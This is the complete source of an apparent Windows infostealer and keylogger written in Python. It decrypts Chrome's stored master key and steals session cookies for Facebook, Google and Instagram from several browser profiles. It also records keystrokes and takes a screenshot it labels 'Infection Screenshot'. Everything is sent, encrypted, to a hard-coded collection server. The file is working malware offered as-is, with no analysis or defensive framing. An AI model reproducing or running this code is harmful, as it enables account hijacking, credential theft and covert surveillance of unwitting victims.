import os, json, sqlite3, base64, shutil, requests, platform, threading, time, io, pyautogui
from cryptography.fernet import Fernet
from Cryptodome.Cipher import AES
import win32crypt
from pynput import keyboard

KEY = b"FUqivB8jbMBTcru1OtQo77xM2ya4QQYHUVKnW2H3C0w="
cipher = Fernet(KEY)
URL = "http://192.168.27.100:8080/report"

current_logs = []

def get_master_key():
    try:
        path = os.environ['USERPROFILE'] + r'\AppData\Local\Google\Chrome\User Data\Local State'
        with open(path, "r", encoding="utf-8") as f:
            c = json.load(f)
        key = base64.b64decode(c["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: return None

def decrypt_val(val, master_key):
    try:
        iv, payload = val[3:15], val[15:]
        c = AES.new(master_key, AES.MODE_GCM, iv)
        return c.decrypt(payload)[:-16].decode()
    except: return ""

def grab_cookies():
    m_key = get_master_key()
    if not m_key: return "Key Error"
    
    profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
    all_data = ""
    
    for profile in profiles:
        path = os.environ['USERPROFILE'] + f'\\AppData\\Local\\Google\\Chrome\\User Data\\{profile}\\Network\\Cookies'
        if os.path.exists(path):
            temp_db = os.environ['TEMP'] + "\\c_temp.db"
            try:
                shutil.copy2(path, temp_db)
                conn = sqlite3.connect(temp_db)
                cur = conn.cursor()
                cur.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%facebook%' OR host_key LIKE '%google%' OR host_key LIKE '%instagram%'")
                for host, name, val in cur.fetchall():
                    dec = decrypt_val(val, m_key)
                    if dec: all_data += f"[{profile}] {host} | {name}: {dec}\n"
                conn.close()
                os.remove(temp_db)
            except: continue
    
    return all_data if all_data else "No active sessions found."

def send(logs, data_val):
    try:
        p = {"os": f"{platform.system()} ({os.getlogin()})", "logs": logs, "data": data_val}
        requests.post(URL, json={"data": cipher.encrypt(json.dumps(p).encode()).decode()}, timeout=15)
    except: pass

def on_press(key):
    global current_logs
    try:
        k = str(key).replace("'", "")
        if k == "Key.space": k = " "
        elif k == "Key.enter": k = "[ENTER]\n"
        current_logs.append(k)
        if len(current_logs) > 60:
            send("".join(current_logs), "Keylog Update")
            current_logs.clear()
    except: pass

def main():
    threading.Thread(target=lambda: send("Initial Grab", grab_cookies())).start()
    
    try:
        ss = pyautogui.screenshot()
        buf = io.BytesIO()
        ss.save(buf, format='JPEG', quality=30)
        img_str = "data:image/jpeg;base64," + base64.b64encode(buf.getvalue()).decode()
        send("Infection Screenshot", img_str)
    except: pass

    with keyboard.Listener(on_press=on_press) as l:
        l.join()

if __name__ == "__main__":
    main()